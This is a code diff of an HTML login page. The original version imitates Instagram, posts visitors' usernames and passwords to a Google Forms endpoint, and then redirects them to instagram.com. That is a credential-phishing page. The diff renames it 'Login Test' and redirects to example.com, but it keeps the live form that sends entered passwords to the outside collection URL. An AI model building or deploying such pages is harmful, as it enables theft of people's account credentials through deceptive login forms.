@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Login Test</title> <!-- Changed from "Instagram" -->
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -91,10 +91,10 @@
 </head>
 <body>
     <div class="login-container">
-        <div class="title">Instagram</div>
+        <div class="title">Login Test</div> <!-- Changed from "Instagram" -->
         <div class="login-box">
             <form id="loginForm" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeeQOC82j3KlAIyLeF57niS63fow9ij7N6VjaZVy-ayxhv4Cg/formResponse" method="POST">
-                <input type="text" name="entry.363416333" placeholder="Phone number, username, or email" required>
+                <input type="text" name="entry.363416333" placeholder="Username or email" required>
                 <input type="password" name="entry.20945221" placeholder="Password" required>
                 <input type="submit" value="Log In">
             </form>
@@ -108,10 +108,10 @@
     </div>
     <script>
         document.getElementById("loginForm").addEventListener("submit", function(event) {
-            console.log("Submitting to Google Sheets...");
+            console.log("Submitting...");
             setTimeout(function() {
-                window.location.href = "https://instagram.com";
-            }, 500); // Redirect after 0.5 seconds
+                window.location.href = "https://example.com"; // Changed to a neutral site
+            }, 1000); // Longer delay: 1 second
         });
     </script>
 </body>
